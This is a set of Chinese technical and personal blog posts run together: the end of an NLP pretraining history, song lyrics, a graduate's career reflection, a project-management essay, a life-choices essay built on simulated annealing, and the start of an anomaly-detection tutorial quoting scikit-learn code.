语言模型及Next Sentence Prediction，但是这里Next Sentence Prediction基本不影响大局，而Masked LM明显借鉴了CBOW的思想。所以说Bert的模型没什么大的创新，更像最近几年NLP重要进展的集大成者，这点如果你看懂了上文估计也没有太大异议，如果你有大的异议，杠精这个大帽子我随时准备戴给你。如果归纳一下这些进展就是：首先是两阶段模型，第一阶段双向语言模型预训练，这里注意要用双向而不是单向，第二阶段采用具体任务Fine-tuning或者做特征集成；第二是特征抽取要用Transformer作为特征提取器而不是RNN或者CNN；第三，双向语言模型可以采取CBOW的方法去做（当然我觉得这个是个细节问题，不算太关键，前两个因素比较关键）。Bert最大的亮点在于效果好及普适性强，几乎所有NLP任务都可以套用Bert这种两阶段解决思路，而且效果应该会有明显提升。可以预见的是，未来一段时间在NLP应用领域，Transformer将占据主导地位，而且这种两阶段预训练方法也会主导各种应用。另外，我们应该弄清楚预训练这个过程本质上是在做什么事情，本质上预训练是通过设计好一个网络结构来做语言模型任务，然后把大量甚至是无穷尽的无标注的自然语言文本利用起来，预训练任务把大量语言学知识抽取出来编码到网络结构中，当手头任务带有标注信息的数据有限时，这些先验的语言学特征当然会对手头任务有极大的特征补充作用，因为当数据有限的时候，很多语言学现象是覆盖不到的，泛化能力就弱，集成尽量通用的语言学知识自然会加强模型的泛化能力。如何引入先验的语言学知识其实一直是NLP尤其是深度学习场景下的NLP的主要目标之一，不过一直没有太好的解决办法，而ELMO/GPT/Bert的这种两阶段模式看起来无疑是解决这个问题自然又简洁的方法，这也是这些方法的主要价值所在。对于当前NLP的发展方向，我个人觉得有两点非常重要，一个是需要更强的特征抽取器，目前看Transformer会逐渐担当大任，但是肯定还是不够强的，需要发展更强的特征抽取器；第二个就是如何优雅地引入大量无监督数据中包含的语言学知识，注意我这里强调地是优雅，而不是引入，此前相当多的工作试图做各种语言学知识的嫁接或者引入，但是很多方法看着让人牙疼，就是我说的不优雅。目前看预训练这种两阶段方法还是很有效的，也非常简洁，当然后面肯定还会有更好的模型出现。完了，这就是自然语言模型预训练的发展史。注：本文可以任意转载，转载时请标明作者和出处。










之前这里是网易云音乐 的外链，许巍演唱版本的《执着》，我们搞IT 的多少都有些执着，后来网页没有了版权，我只好放上来歌词了。 如果对文章没有太多兴趣，可以只读一遍歌词，或者听一遍歌，哈哈。
每个夜晚来临的时候
孤独总在我左右
每个黄昏心跳的等候
是我无限的温柔
每次面对你时候
不敢看你的双眸
在我温柔的笑容背后
有多少泪水哀愁
不管时空怎么转变
世界怎么改变
你的爱总在我心间
你是否明白
我想超越这平凡的生活
注定现在暂时漂泊
无法停止我内心的狂热
对未来的执著
拥抱着你Oh my baby
你看到我在流泪
是否爱你让我伤悲
让我心碎
拥抱着你Oh my baby
可你知道我无法后退
纵然使我苍白憔悴
伤痕累累

文章大纲1. 从前有一个程序员，成天写代码，后来，他屎了2. 我选择的路，值么？3. 献身理想

每天你都有机会和很多人擦身而过，而你或者对他们一无所知，不过也许有一天他会变成你的朋友或是知己……
先来看看老王和他的IT界朋友们吧











p.s 经常有人问我，老王，你明明可以穿的挺帅，为什么总是穿的很随意呢？
其实道理很简单，我是做技术活的，打扮太好人家会以为我技术不行。

1. 从前有一个程序员，成天写代码，后来，他屎了
1.1 一门可以靠手艺混饭的专业
你好，非常荣幸能够步入改变世界的软件开发行业，接下来我们聊点正经的。回首近7-8年来的时光，发现自己可能将要走向程序员这条道路的时候最早可以追溯到2008年高考完填写志愿，那时候分数所迫，二本学校的好专业都上不了，我就想有什么专业是可以不靠学校名声而靠自己努力成就一番霸业的？思来想去选择了–计算机，作为第二志愿。。。显然那时候会计这个专业更火一些。
入学一年以后我有了自己第一台笔记本电脑，然而第一个装上的应用程序居然就是魔兽争霸之冰封王座，后来我们的基本修养是从练习打字，office软件开始，我是有点不屑于这样很low的东西，然而这些都是基本功，好像少林拳法，你得把少林长拳练个一年半载再练什么韦陀掌罗汉拳修习内功心法十几年有了根基再练七十二绝技，其实
不要轻视任何一种编程语言或者技术，这些很low的东西确确实实作为基础存在为后续高端东西铺路的。
1. 2.出来混，迟早要还
当时学校开设了vb，我又开始犯眼高手低的毛病觉得这玩意是吧，拖拖控件有什么前途？直到我看见雷总设计的十字路口交通信号灯模拟，车子随机出现带有阴影并且看到红灯能够减速，直到很多年后我才明白，技术只是手段其本身并没有优劣高下，主要看你的应用场景。就好像马克思说的武器不重要，重要的是人，一切语言技术都是服务于自己的思想的。后面还学习了几门印象深刻的课程，《网页设计》，同样给我潜意识里造成前端工作没啥技术含量的一门课程，从龙哥那里摸来了一个可以实现字幕的滚动效果的标签，就给自己网站首页index.html所有标题乐此不疲的加上，还有通过修改html把百度一下改成百度两下。这样的无知少年终于招来了老司机的呵呵，也是从那时候起，看了一本对我职业生涯影响深远的电子书《IT小小鸟》，从此泡上了论坛，从此不太看电视了，从此去了大学就喜欢在分类号TP391下面来回转转。
后面学到c++，java，听30几岁的秃顶老师站在台上用20年的开发经验鄙视java效率太差的时候，我的内心充满了崇拜。后面大家拼了命的照着马士兵的视频敲坦克大战，我对此嗤之以鼻。结果JAVA没怎么学，jsp也挂科了，因为两者是一个老师教的，我对java的鄙视甚至延伸到了老师身上，觉的那个老师也效率低下。不过好像确实如此，从来没见过他用快捷键调试jsp，都是后来去企业实训，代课大牛用myeclipse调试的飞起，我才恍然大悟——这玩意还能调试？！
那时候班里学c++的人不多，好像这个成了偏门一样，大家都去外面报了班培训三大框架，祥龙学安全方面的内容，我在学习MFC，当然其实跟没学没啥两样，代码自己就没有敲过多少行，一心就想着考研了。大学期间学过仅有的有意义的课程当属《操作系统》《数据库》，当然还是两位老师的人格魅力更加出众，几种解决同步互斥的算法我至今不是太清楚，数据库化简关系模式的算法也得上网搜了才会算。《计算机网络》《数据结构》这两门课呢，一个猥琐的抠脚大叔（没错真的是在办公室抠脚的学院当时唯一一个教授）教的，基本全靠自学，应了本段的标题，在研究生找工作期间，c++方向的面试基本全部围绕了网络进行深入探讨，滑动窗口，三次握手，拥塞控制，手写快排等等一个都跑不了，于是我面的c++岗位基本没过几个面试。出来混，迟早要还。
1.3.培养自己独立解决复杂问题的能力
回想后来大学时候在沉静下来的日子里自己还是干了点实事，系统的学习了photoshop，这激发了后来我走上计算机视觉的道路，虽然我在自然图像处理上主要用opencv库，python等封装好的算法接口，基本对图形图像处理这个行业有了整体的感觉，有什么需求大概能知道需要什么样的技术手段去解决，15年底我成为了CSDN图形图像处理版的版主，2016年6月终于凭借一些图像图像处理领域的博文评上了博客专家。我很欣慰在即将到来的生日迎来这个蛮光荣的称号。
上研究生后，选择导师时候希望继续学习图形图像处理，计算机视觉的相关内容，我导师的主要研究方向是搞三维重建听起来也是非常高大上，其实现在的VR就是三维重建的高端应用的吧。后来老师一直比较忙，而且到了我们这里项目没有衔接上，科研的方向选择就出现了青黄不接的尴尬情形。我从最开始老师推荐的图割算法研究的初始方向入手，从图像分割研究到立体匹配，用一句话概况就是如何改进提高图割算法在图像分割和立体匹配两个应用问题上面的性能。要么降低网络图的规模，要么改进图割算法。前人挖了个大坑，我看明白算法才深深体会到了自己做了三年的填坑工作。
三年的研究生涯，我在学术上面看到的论文仅仅是明白了其他人做研究的方法，对于如何创新的提出自己原创的idea去解决问题这样的能力培养基本为零，也没有能很好的锻炼出复现别人论文中代码的能力，要是别人的好方法没有给出代码，那么这个领域的问题研究就无法开展。这样的后果是严重的。直到快要毕业，才找到了立体匹配领域里面应该看的网站，文章，比如ipol，比如Middlebury，比如KITTI。
从开学初始，当老师问我想读博还是工作时候，年轻的我就希望早点工作赚钱，现在看来这个决定还是太草率。快要毕业了，这才心有不甘。希望自己在工作岗位上，面对各种诱惑，对于前面学过的知识做到常读常新，把基础巩固好，这样才能具有独立解决复杂问题的能力。
1.4.唯手熟尔
上大学时候，可能很多人想去做做兼职，挣点小钱喝点小酒，这样的想法也就延伸到研究生期间来，我们看到其实几年来潜心在实验室呆着的同志科研成果都非常好，这样在一个领域混熟了，把理论都研究透了，就是这个领域的专家。
再拿数学举个例子，高等代数，矩阵论里面成天算特征值特征向量，到底有啥用？现在机器学习这么火，稀疏矩阵降维就是用这两个东西表征的嘛，大学时候这些东西我们都学了，却为什么见了阿尔法狗那么遥不可及？基础啊，基础东西很重要。我认为只有将基础的东西融会贯通，烂熟于心，才能完成第三点，独立完成复杂的任务。这才是企业，科研单位需要的高级人才，也是三年到五年工作经验中我们应该着力培养的点。
我其实实习过不少单位，深圳中软，西安天文点，IBM，研究所，一路走来无论是大公司还是小单位，在我每天完成工作日志的时候，我确实发现会和熟是两码事，也许你会说他们中间的区别就是忘记了百度一下，但成年累月下来，就是软件行业加班恶习的罪魁祸首，以及自我提升的最大拦路虎(比如有的研究所就是没有外网碰到配置JAVA环境变量，或者部署机器怎么办？)。在工作中，我们强调设计模式和经验，这些都是套路，唯手熟尔！

2. 我选择的路，值么？
有天坐公交车上来个傻子，不停的说笑，后来全车人都被他逗笑了，他却冷下脸来看着其他人说：傻子，你笑什么？
快毕业了，读了几本书，贾平凹废都写九十年代的陕西出了一帮子浪子闲汉，他们总是不满意这个不满意那个，浮躁的像一群绿头苍蝇，然后我看了陈忠实的康家小院，萧红的呼兰河传，又是不同的风格，到头来发现前辈们在书中文字里都有一种平和纯粹的专注美。《白鹿原》不愧为获得了茅盾文学奖的宏大作品，当一个老陕用地道的关中话在心里朗读这些文字的时候，你才能体会到这部作品带给你真实的，自己现实经历过地风土人情。
回顾自己三年的研究生学习确实浮躁，做了很多浅尝辄止的事情，比如做学生干部，却也没去高校读博当老师，也没去考考公务员，比如做计算机双目立体视觉，却连双目摄像头都没买一个，听了机器学习的课程却没有坚持下来。这个时代需要为自己做做减法，一个人在信息爆炸的时代，需要沉浸下来，专心致志的把一件事情做好。我一直有这种想法，希望为时不晚。
最近一段时间同学们的离校，让我心中充满了前所未有的不甘与疲惫，我们这个年龄的人大都有着同样的困惑，爱情事业，choise a f**king life。人生中黄金的三年恍如看电影按了快进。我选择的路，值么？

3. 献身理想
如果不献身给一个伟大的理想，生命就是毫无意义的。----何塞，黎萨尔
1947年，在给长子***的信中 ，***写道：“一个人无论学什么或者做什么，只要有热情，有恒心，不要那种无着落的与人民利益不相符合的个人主义虚荣心，总会有进步的。”还特意在这段话下划了横线。那一年 *** 25岁
“生存还是毁灭，这是一个问题。”哈姆雷特的这句话，给我留下了极为深刻的印象。年轻的我，在当年陕北贫瘠的黄土地上，不断思考着“生存还是毁灭”的问题，最后我立下为祖国、为人民奉献自己的信念。那一年**** 16岁刚刚当选为生产队支部书记。
在 2012-13 赛季，邓肯减轻了 15 磅的体重。波波维奇透露，邓肯通过沙滩跑，扔铁饼、拳击等方式减重。此外，圣安东尼奥当地记者麦克卡尼开玩笑说，邓肯的饮食就像是一只老鹰的菜单（只吃鸡肉）。 当然了，邓肯只能延缓衰老，却不能逃避。于是，当身体机能不可能避免地下降时，他便靠改变打法，以及经验、意识和基本功去弥补。为什么有了 4 个冠军，他依旧要这样过这样苦行僧一样的生活呢？邓肯说，他喜欢跟队友一起坐飞机，一起去客场比赛的感觉。
他纯粹就是热爱篮球。所以，蒂姆·邓肯，他到底是年轻，还是老呢？他大一时就已经可以进入 NBA，但为了完成心理学学位，他一直等到大学毕业才参加选秀。这在今天，他等于放弃了一千万美元。还没 20 岁，他就像中年人般自律成熟。但在 38 岁的时候，他的赤子之心依旧没有变。在奠定了历史第一大前的地位，赚到了上亿美元以后，他依旧像新秀一样努力。他不为金钱和荣耀，只是为热爱而打球。诺维斯基在采访中说：“他（邓肯）永远只想着赢球，从来不会想着为自己打造品牌，这就是我最钦佩他的地方。”并不是热泪盈眶才叫青春，也不是莽撞热血才叫年轻。不忘初心，便始终都是年轻。悲哀的是，多少人把放纵当热血，并把早熟和自律当做陈腐来嬉笑。岁月还未过多流逝之前，他们的身体和精神就已经被掏空，提早告别了青春。
不忘初心，严格自律，正是这些杰出人物的共同特点。在此，老王和大家共勉。
关注我的订阅号：老王和他的IT界朋友们，我们在这里缅怀IT人的情怀，在这里think different，在这里stay hungry，站在老王他们家隔壁的风口上灰翔！！！




扫码关注公众号











个人答疑号



















文章大纲1. 何为项目经理？1.1 项目经理和产品经理的区别1.2 项目经历的前景1.2.1 项目经理的升维1.2.2 项目经理的成长1.3 项目经理的管理1.3.1 总体考虑的角度1.3.2 敏捷开发2.智、信、仁、勇、严 与项目经理的工作智信仁勇严参考文献

1. 何为项目经理？
我一直觉的项目经理是个扯淡的活儿，拆分任务、跟踪进度，这不就是催别人干活么。上传下达做好沟通，偶尔帮忙看看技术问题，因为我们项目有个经验丰富的技术架构师，也不用太操心。最近偶尔看到一些经验分享，发现其实项目经理的管理真正是一门艺术，因为和不同的人打交道本身就是一个难度很大的事情。
不夸张的说：

老板拍脑袋卡工期，随意调整项目计划，作为项目经理的你，除了接受，还能咋样；
你使出洪荒之力，加班累到傻，项目管理的路上仍然坎坎坷坷；
项目终于按时上线了，却得罪了一帮子干系人……

最烦人的就是拍脑袋了，一拍脑袋，2拍大腿，才发现f**k 不能这么做呀
1.1 项目经理和产品经理的区别
项目经理要求技术背景，这是必须的，一般团队的项目经理由非常有项目经验的R&D担当，他的职责在于将目标转化为可量化可实现的项目计划，偏重于执行层面。而产品经理的知识领域较泛，且不一定非要求懂技术。
产品经理从用户角度考虑、项目经理从时间成本角度考虑，两者频繁沟通、才能创造好的产品，才能为公司创造价值。

1.2 项目经历的前景
项目经理（ Project Manager ) 是项目团队的领导者，首要职责是在预算范围内按时优质地领导项目小组成员完成全部项目工作内容，使项目达到预期要求。 为此项目经理必须在一系列的项目计划、组织和控制活动中做好领导工作，从而实现项目目标。
在大公司，产品经理和项目经理分工是非常明确的，但在初创公司和一些中小型公司产品经理和项目经理通常是一个人，节约人力和沟通成本。
1.2.1 项目经理的升维
项目经理看到的维度，是“计划”和“投资”的发展。什么时间应该拿到什么资源，什么任务和人力应该开始动作，这个动作不能按期发出，后面的行为就要发生改变。如果项目经理也是每天都说：“今天又完成了XX”，“这个月又完成了XX”。这个项目经理肯定要出问题。
开发工程师天然会掩盖问题，会向架构师和项目经理报告“坑已填平”的。而架构师和项目经理天然会暴露问题，向团队报告：我们这样下去，会掉XX坑里。

项目经理需要及早预见及早预见团队及项目发展趋势，
项目经理需要及早发现目前团队和项目所在的问题并及时暴露，
项目经理需要及早预见计划和投资上会掉哪个坑里的。


现实中，通常资深的工程师才会转岗为架构师和项目经理。所以，人们很容易把架构师和项目经理看做是“领导”和“汇报对象”。但从团队定义来说，架构师、项目经理只是团队中两个完成独立工作的角色。在精英团队中，基本上这些角色的地位是完全平等的。他们好比一群在同一条船上的人，有人负责看路，有人负责划桨，缺了谁都不行。所以，架构师和项目经理不是开发工程师的“升级”，但在很多情况下，他们值得尊敬，因为如果他们正确履行了他们的职责，那么他们就是放弃了“求礼”的机会（“这个代码是我写的”），为团队做出了贡献。


所以，初上岗的架构师和项目经理们，你们首先要准备好牺牲，而不是把这个作为一种荣耀。但这个世界，都是以其无私，所以成其私的。你放弃写代码的礼，收获的是另一层逻辑上的经验：这个系统这样搭建，它的效果将会是这样的。不要收益都放在你面前了，却弃如敝履。

成为项目经理，你获得的是一种升维，从另一个角度查看项目的视角。
1.2.2 项目经理的成长

最好的成长是自己的成长
更好的成长是带动大家一起成长

要说真的怎么成长，这种罗列干条条的文章我比较喜欢：
你不知道的项目经理成长路

1.3 项目经理的管理
1.3.1 总体考虑的角度

定义一个项目的目标时，时间、成本、范围和质量这四个维度是缺一不可的。而当我们接到领导派的一个项目时，往往只能确定其中1个或者2个。这里就体现出PM的价值——加速。即，如何多快好省的去达成项目目标。
另一方面，这个铁三角，其实又是一个制约的关系，也就是说，多快好省，其实是一个某种意义上的平衡。这也是我理解的PM的另外一个价值——平衡。
时间和成本，是决定着效率，是短期目标；范围和质量，决定着效果，是长期目标。长期目标是大于短期目标的，即对于项目来说，效果大于效率，但效率和效果也同样是需要保持某种意义上的平衡。

1.3.2 敏捷开发
在敏捷的两个门派：XP、Scrum中，整理归纳了很多可以用于协助软件开发的实践，统称为敏捷实践。
XP 我听说TW 用的最多，一般的公司多采用Scrum。

Scrum 的核心要义有以下几点：


Scrum团队：5-7个人的小项目团队， 团队的负责人可能担负起Scrum Master的角色。


Backlog: 急待完成的一系列任务，包括：未细化的产品功能要求、Bugs、缺陷、用户提出的改进、具竞争力的功能及技术升级等，按优先级定义出来，这些任务可能不是完整的，甚至可能随时会更改或添加。


Sprint(冲刺): 通常为30天的迭代时间，把Backlog中的每一项安排在Sprint中，由团队估算出所需要的时间（按小时记）。 每一次Sprint之后，一定要有可以交付使用的功能。


Scrum会议: 这是与传统方式最大的区别，每天15-20分钟的Scrum会议，通常在每天的同一时间和同一个房间内举行。Scrum团队所有人都参加，也可以有旁听者（但不允许旁听者指手划脚）。 在这个15分钟的会议上，Scrum Master会询问每个成员三个问题:




a) 自上次Scrum会议后的1天里你做了什么？
b) 从现在到下次Scrum会议的1天时间里你准备做什么？
c) 你在工作中遇到了哪些困难？


每个成员在Backlog条目上所花费的时间会被记录到Spring backlog中。 Scrum Master在会上对存在的问题提出即时的解决方案或指导，使团队不断向着目标前进。Scrum会议不同于项目会议，对团队来说，它起到了快速简报的作用。


通过Sprint Backlog的分析，可以了解Backlog的进度，尽早的了解所发生的问题


管理者不在是项目或者团队的老板, 而是帮助团队解决问题的协调者或是助手。


每一次Sprint之后要review，团队按照既定的Sprint Backlog目标来演示完成的内容。



2.智、信、仁、勇、严 与项目经理的工作
孙子兵法：将者，智、信、仁、勇、严也。
智
智指智谋、谋略，将而无谋，兵之大忌，故排首位；
所谓为将的智，应懂谋略，谋略二字可要好好想想，不是算计，而是计算！
哪一个企业都不会养闲人（其实这是一个危险信号）因为嘛，要养也就只是一时，某些所谓的闲人还有其可以利用和挖掘的价值。
其次，分析手里现在带领的团队，智者，应知道，让袋鼠跳远，松鼠爬树的道理，你非要把一些你讲了两遍都不懂的事情交给同一个人做，浪费了你的心力，增加了支出成本。也许你会觉得我有点夸大，可是有时的支出并不只是在人们所看到的金钱上，精力、智力、人力等等，一样都是成本。所以才说，为将的智，要懂谋略，因为为将就像是一个人放风筝，你手里拽着的是那个拉扯着团队的线，‘天气’你已经改变不了了，‘地理’位置也不是你可以选择的，那么这个线何时收一收，何时紧一紧，才能让你的风筝飞的更高？是应该好好去考虑的，对吗？所以智要能识权变、识变通；
信
信指信义，只有信义才能令人信服，是军队内部团结一致。；
所谓信！谈谈历史，中国虽然最后取得了革命的胜利，可是跟日本抗战比起来，中国就晚了8年，为什么？因为我们有内战，要先打赢内战。而日本从始至终都只有一个天皇。可是，何所为得民心者得天下！为王如此，为将一样！中国抗战也罢、抗日也罢，顺应民意出兵，得民心、军心者得胜仗！你可知，商鞅变法，以立信为先！（你可看看立木取信的故事）所以，信，则民心民力可用。不信，则民心民力皆不可用。你要想把事情做好，怕是需要让上面，下面都信你。对上要让对方看到你的方案：有理据、有方法、可操作、可实施，有预见性结果！取信于上，你才可以有实权！取信于下，要把这支队伍逼到绝境，所谓绝处逢生！就算你没有实权，你可同领导统一口径，把交给你们的任务，告知所有的部下，我们这支团队，如果这些事情做不好，会有怎样的后果！你不说裁员，不说降薪，没有让大家看到绝境所处的情况（所谓地者，远近、险易、广狭、死生也），他们怎可有动力，但记着，也一定要团队看到你心里装着大家的利益，并有能力让对方清楚这一点。所以对下，即便没有生杀大权，你也可利用具体的实施方案，让工作一点点推进，有成效。大家就会一点一点的愿意跟着你做，因为你提前给大家看到了预见性的结果，团队会有一个未来的愿景！记得为将者，动员、说辞、团队宣传统一思想这些都很重要。所以信不只是一种机制，也是团队将领的人格力量。
仁
仁指仁义，仁义的军队才能受到百姓的拥护，拥有好的声誉，民心所向，也就是所谓的“得到了天命”；
为仁！爱人悯物！以身作则！好好揣摩！仁者要有度！你和团队都不能同吃同住同甘苦共患难，何以带兵？你加班后不关电脑，电灯……其身不正，不知悯物，何以为榜样？团队里有人有难处、困难你不亲自帮扶，又何以有仁？何以得亲信？
勇
勇是指勇武，狭路相逢勇者胜，将勇则兵强，勇能生势，所谓兵之势也；
为勇！何所为勇？不只是勇敢，而是要有所担当，很多人最做不到的，也是最想回避的就是怕承担，自己的决定所造成的后果。为将者，连这样的担当和勇气都没有，不可为将！
严
严指纪律严明，只有严格要求才能军纪严整，是能否一支军队带成铁军的必要条件。
为严！“以威刑肃三军！”军法适用于所有人，连将同等受罚。赏罚有度，军纪严明，没有什么靠山背景，大家一样。你怎会带不好团队，做不好事情呢？

参考文献
实战分享｜在项目推进中，产品经理需要经历的6个阶段
项目管理5阶段｜一位高级项目经理的4年项目经验分享
https://zhuanlan.zhihu.com/p/64653566
https://www.zhihu.com/question/19761742/answer/884637532
https://zhuanlan.zhihu.com/p/27052274
https://zhuanlan.zhihu.com/p/83701918
https://www.zhihu.com/question/19667544/answer/12594221
https://zhuanlan.zhihu.com/p/33415983










作者： 一人
前些日子听一档节目，嘉宾讲了自己朋友的一个故事，这个朋友称为老甲吧！老甲在九几年在上海交通大学读本科，大学四年一晃很快过去了，要毕业找工作。那个年代流行出国留学，老甲也有此打算。话说，老甲有个老表哥在杭州的电子城给人家撺掇电脑，在卖电脑的过程中，认识了一个创业的小伙子，两人有缘聊得很投机，小伙子就邀请老表哥加入他们公司。老表哥当时有家室了，感觉一时不便，正要婉拒时想起了老甲，心想老甲到了毕业的时候，还没有找到工作，就将老甲介绍给了这个小伙子。之后老甲就按照老表哥的指引去杭州面试了。面试过程中的理想热血暂且按下不表。
最终老甲顺利拿到了offer。说来也巧，不久老甲也接到了美帝大学的研究生录取通知。九几年的中国创业公司与美利坚的大学，答案是十分明确的，老甲去美利坚喝咖啡吃面包去了。时间过得很快，四年后，老甲硕士毕业，又读了博士。博士毕业以后听说在硅谷顺利的当上了“码皇”，从此也过上了拿美钞、喝洋酒的资本主义生活。

话说回来，当初的那个小伙子呢？他收购中国雅虎，致使ebay退出中国市场，亚马逊苟延残喘，收购肯德基中国，已坐拥中国互联网半壁江山。他就是今天的阿里巴巴集团董事局主席马云。当初跟着他在湖畔创业的小伙伴们呢？刚刚退位的彭蕾，已经坐上了内地女性富豪榜的首位。
有小伙伴想说了，如果老甲当初从了老马，岂不是发达了吗？嘿嘿，同志，不要太天真了，人生就没有“如果”。有人是不是要骂娘了，那说这些有毛用？莫着急撒，咋们慢慢聊。如果我们可以预测未来，我们直接早早去傍大腿就完了。还是那句话“人生就没有如果”，我们是不能预知未来的。但是，那些历史上伟大的科学家们留给了我们一些方法，可以有更大的概率接近理想的状态。

要想把这些方法道清楚说明白，我们需要先回头重新看看老甲的故事。九几年，对于一个即将毕业的大学生，根据当时的状况来看，最好的选择就是出国留学了，也就是说老甲当初选择了当时看来最优的决策。细细回想一下，如果我们自己是老甲，会不会也是同样的选择呢。我想大多数人的答案是肯定的。这说明，我们大多数人做决定，都是选择当下对自己最有利的决策。
不幸的很，老甲的例子就说明了一个事实，当前最优的选择对于整个人生来讲或许并不是最优的。也就是说我们每个人都会有错失人生良机的风险。用学究一些的语言来讲就是，一直选择当前最优的决策容易陷入局部最优而非全局最优。
有小伙伴是不是想说，你是不是想告诉我，人生需要一些随机性呢？是的，正是如此。那是不是胡乱选择就行了。要真是这样就简单了，我就不用在这废话了。
随机性也是有讲究的。一个人在成长的过程中会同时面对很多机会，而且机会之间往往是互斥的。科学家告诉我们，当面临多种选择的时候，每个选择都有前景，而前景之间往往是有大小区别的。举例来说，这里我们有三个选择分别为：A、B、C，各自的前景为：0.3， 0.2， 0.5（数值越大前景越好）。那么如何做选择呢？现在我们有一枚标着数字0-9的均匀筛子，按照三个选择的前景大小将数值分配：
A→(0,1,2)|B→(3,4)|C→(5,6,7,8,9)A→(0,1,2)|B→(3,4)|C→(5,6,7,8,9)A\rightarrow(0,1,2) | B\rightarrow(3,4) | C\rightarrow(5,6,7,8,9)
之后，将这个筛子抛起，落下后正面朝上的数字所属的选择，我们就选择它。

有人会问，我这样随机选择，万一这个选择效果不好怎么办，如果一直呆在那，我岂不是职业生涯就瞎了。莫事莫事，不要担心，科学家又告诉我们，当随机选择的效果不好的时候，回到曾经经历过觉得最好的地方。那在这之后，是不是乖乖呆在那就行了？当然不是这样，你可以继续随机。但是此次随机后，我们就不是简单的接受随机结果了，这里对于随机结果设置了一个接受率。这个接受率随着你后悔之后回到曾经觉得最好的地方的次数增多，这个接受率逐渐下降。怎么判断是否接受这个随机结果呢？答案很简单，你再随机一个0与1之间的数字，如果这个数字小于接受率，那么就接受这个随机选择，否则不接受。这样，随着你接受随机结果之后感觉不如以前的选择，又回到特定点的次数增多，接受率就会下降，拒绝改变的概率增大，生活就会逐渐稳定下来。这种方法在算法中称作“模拟退火”1。理论上已经证明依概率收敛于全局最优解。用人话就是说，有很大的可能到达人生巅峰。
因此当前看起来最好的也不一定是你最终想要的，要想寻找到自己理想的选择实现人生价值有的时候需要些随机因素。
以上只是谈到了数学上的方法，仅仅从增大随机性上进行了阐述。对于做好人生选择我们还有其他方面需要做：
1. 拓宽自己的视野
通过拓宽自己的视野，可以看到更加长远的发展，这样在选择的时候就有了更大的概率避免一叶障目不见泰山的情况。具体可以从以下几点做起：

多读书：在阅读专业领域的书籍之外，也读一些其他领域的书，艺术、自然科学、社会科学，人文等都要所了解，对于专业以外的领域，明白各个领域的总体框架，等到生活中用到相关知识的时候，知道在哪里去找答案就可以了，如果自己有闲余时间，挑一个自己特别感兴趣的领域学习一下也是可以地。
多与拥有不同背景的人交流：每个人的精力是有限的，而知识是无限的，且很多知识随着时间的变化也在发生变化，“以有穷追无穷,殆矣”，每个人最终都是对自己擅长的领域有合理的见解。那么要拓展自己的视野，从与别人的交流中获取信息就是必不可少的方式了，因此，多和拥有不同背景的人沟通他们擅长的领域，你就能获得更全面的知识，拥有更宽泛的视野。
阅读社会与科学的前沿研究成果：熟悉中心极限定理的同志肯定会认同一个结论，我们的社会是符合正态分布的，掌握社会规律或者发展趋势的人只是很微小的一撮人。他们的声音与蛊惑大众的声音相比是极其微弱的，而这些社会精英人士的发声多是以调研报告与学术研究论文等的形式发表在特定刊物或者网站上，因此，要想从洪流般的信息中挑选出这些重要有价值信息是十分艰难的，因此，我们要抛弃原来的信息获取渠道，选择从这些权威机构或者学术媒体获取社会与科学的前沿研究成果，以此来拓宽我们的视野。

2. 咨询他人意见
从前部分的描述中我们可以清晰的认识到，每个人都是有局限的，那么当我们面临多种选择的时候，咨询他人的意见就是增加决策成功的一种可选方法了。

建立人生导师队伍。我建议大家一定要及早的建立自己的人生导师队伍，他们是一群真心关心你、具有不同行业背景、年龄阶段、性别的人。他们是真心的帮助下一代年轻人，不计较任何的利益得失，定会公正对你的状况给予自己的意见。在你需要决策的时候，可以咨询你的导师们，将他们的意见综合分析之后，在做决断。
与导师关系的维持。对于维持与导师的关系，我个人建议是每隔半年或者一年亲自拜访一次就可以。

最后，当你看到一个人放着最好的不选，而做出其他选择的时候，请不要大惊小怪了，人家那才是聪明的选择。
wikipedia, Simulated annealing ↩ 









未完待续
文章大纲什么是异常检测异常定义异常发掘异常检测的一般步骤数据加载Meanshift 聚类IsolationForest 异常检测参考

什么是异常检测
异常定义
https://blog.csdn.net/App_12062011/article/details/84797641
现有数据挖掘研究大多集中于发现适用于大部分数据的常规模式,在许多应用领域中，异常数据通常作为噪音而忽略，许多数据挖掘算法试图降低或消除异常数据的影响。而在有些应用领域识别异常数据是许多工作的基础和前提，异常数据会带给我们新的视角。
如在欺诈检测中，异常数据可能意味欺诈行为的发生，在入侵检测中异常数据可能意味入侵行为的发生。

异常发掘
异常挖掘可以描述为：给定N个数据对象和所期望的异常数据个数，发现明显不同、意外，或与其它数据不一致的前k个对象。
异常挖掘问题由两个子问题构成：
(1)如何度量异常；
(2)如何有效发现异常。
异常检测的一般步骤
一般步骤

构建“正常”行为的资料集


资料集可以是针对数据整体的图案或者汇总统计- 资料集可以是针对数据整体的图案或者汇总统计


通过使用“正常”资料集检测异常行为


异常行为是特征与“正常”资料有显著差别的观察对象


异常检测方法的类型


分类和聚类
基于统计的方法
基于距离和基于密度的方法
基于图形的方法




数据加载

Meanshift 聚类
从源代码可以看出：
https://github.com/scikit-learn/scikit-learn/blob/7389dba/sklearn/cluster/mean_shift_.py#L298
<class ‘sklearn.cluster.mean_shift_.MeanShift’>
中显示不能分类的数据其类别标签就是-1
def mean_shift(X, bandwidth=None, seeds=None, bin_seeding=False,
               min_bin_freq=1, cluster_all=True, max_iter=300,
               n_jobs=None):
    """Perform mean shift clustering of data using a flat kernel.
    Read more in the :ref:`User Guide <mean_shift>`.
    Parameters
    ----------
    X : array-like, shape=[n_samples, n_features]
        Input data.
    bandwidth : float, optional
        Kernel bandwidth.
        If bandwidth is not given, it is determined using a heuristic based on
        the median of all pairwise distances. This will take quadratic time in
        the number of samples. The sklearn.cluster.estimate_bandwidth function
        can be used to do this more efficiently.
    seeds : array-like, shape=[n_seeds, n_features] or None
        Point used as initial kernel locations. If None and bin_seeding=False,
        each data point is used as a seed. If None and bin_seeding=True,
        see bin_seeding.
    bin_seeding : boolean, default=False
        If true, initial kernel locations are not locations of all
        points, but rather the location of the discretized version of
        points, where points are binned onto a grid whose coarseness
        corresponds to the bandwidth. Setting this option to True will speed
        up the algorithm because fewer seeds will be initialized.
        Ignored if seeds argument is not None.
    min_bin_freq : int, default=1
       To speed up the algorithm, accept only those bins with at least
       min_bin_freq points as seeds.
    cluster_all : boolean, default True
        If true, then all points are clustered, even those orphans that are
        not within any kernel. Orphans are assigned to the nearest kernel.
        If false, then orphans are given cluster label -1.
    max_iter : int, default 300
        Maximum number of iterations, per seed point before the clustering
        operation terminates (for that seed point), if has not converged yet.
    n_jobs : int or None, optional (default=None)
        The number of jobs to use for the computation. This works by computing
        each of the n_init runs in parallel.
